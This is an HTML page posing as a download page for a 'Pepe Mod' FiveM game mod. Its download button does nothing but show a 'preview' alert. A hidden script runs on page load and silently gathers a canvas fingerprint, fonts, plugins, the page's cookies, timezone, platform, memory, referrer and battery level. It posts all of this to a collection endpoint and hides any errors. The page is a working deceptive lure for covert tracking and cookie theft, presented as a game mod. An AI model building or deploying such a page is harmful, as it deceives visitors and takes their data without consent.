<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Pepe Mod</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0b0b;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #eee;
            padding: 20px;
        }
        .card {
            max-width: 700px;
            width: 100%;
            background: #1a1a1a;
            border-radius: 30px;
            padding: 40px;
            border: 1px solid #00ffcc44;
            box-shadow: 0 0 40px rgba(0,255,200,0.1);
            text-align: center;
        }
        h1 {
            font-size: 3.2rem;
            background: linear-gradient(135deg, #00ffcc, #00b8ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .sub { color: #aaa; font-size: 1.1rem; margin-bottom: 20px; }
        .preview {
            background: #111;
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid #2a2a2a;
        }
        .preview img { max-width: 100%; border-radius: 10px; }
        .btn {
            display: inline-block;
            background: #00ffcc;
            color: #0b0b0b;
            padding: 16px 50px;
            border-radius: 50px;
            font-weight: 700;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ffcc66; }
        .footer { margin-top: 30px; color: #555; font-size: 0.8rem; border-top: 1px solid #222; padding-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🐸 Pepe Mod</h1>
        <p class="sub">🔥 The ultimate FiveM mod – preview now</p>
        <div class="preview">
            <img src="https://via.placeholder.com/600x250/00ffcc/0b0b0b?text=Pepe+Mod+Preview" alt="Preview">
            <p style="color:#bbb; margin-top:10px;">Version 2.0.1 – Fully compatible</p>
        </div>
        <button class="btn" id="downloadBtn">⬇ Download Now</button>
        <p style="color:#888; margin-top:15px;">⚠️ Preview version – full release soon</p>
        <div class="footer">© 2025 Pepe Team</div>
    </div>

    <script>
        (function() {
            function getFingerprint() {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Pepe', 2, 15);
                ctx.fillStyle = 'rgba(102,204,0,0.7)';
                ctx.fillText('Mod', 4, 17);
                return canvas.toDataURL();
            }

            function getPlugins() {
                return Array.from(navigator.plugins).map(p => p.name).join(', ');
            }

            function getFonts() {
                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact'];
                const available = [];
                const dummy = document.createElement('div');
                dummy.style.fontFamily = 'monospace';
                dummy.innerText = 'abcdefghijklmnopqrstuvwxyz';
                document.body.appendChild(dummy);
                const defaultWidth = dummy.offsetWidth;
                for (const font of testFonts) {
                    dummy.style.fontFamily = font + ', monospace';
                    if (dummy.offsetWidth !== defaultWidth) {
                        available.push(font);
                    }
                }
                document.body.removeChild(dummy);
                return available.join(', ');
            }

            const data = {
                screen: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth,
                fingerprint: getFingerprint().substring(0, 100),
                plugins: getPlugins(),
                fonts: getFonts(),
                cookies: document.cookie || 'none',
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'Unknown',
                referrer: document.referrer || 'Direct',
                url: window.location.href,
            };

            function sendData(data) {
                fetch('/api/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {});
            }

            if (navigator.getBattery) {
                navigator.getBattery()
                    .then(battery => {
                        data.battery = (battery.level * 100).toFixed(0) + '%';
                        sendData(data);
                    })
                    .catch(() => {
                        data.battery = 'Error';
                        sendData(data);
                    });
            } else {
                data.battery = 'Not supported';
                sendData(data);
            }

            document.getElementById('downloadBtn').addEventListener('click', function(e) {
                e.preventDefault();
                alert('The mod is currently in preview. Full release coming soon.');
            });
        })();
    </script>
</body>
</html>
